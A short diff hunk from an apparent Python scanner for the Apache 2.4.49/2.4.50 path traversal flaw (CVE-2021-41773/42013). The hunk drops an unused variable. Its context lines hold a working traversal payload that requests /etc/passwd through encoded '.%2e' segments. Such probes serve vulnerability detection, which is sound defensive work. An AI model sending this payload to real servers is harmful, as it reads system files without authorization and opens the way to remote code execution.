@@ -83,7 +83,6 @@ def probe_apache_path_traversal(host: str, port: int, scheme: str = "http",
     CVE-2021-41773 / CVE-2021-42013 — Apache HTTP Server 2.4.49/2.4.50
     Unauthenticated path traversal and remote code execution via mod_cgi.
     """
-    h = host.encode()
     # CVE-2021-41773: single %2e encoding
     path1 = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
     req1 = (f"GET {path1} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
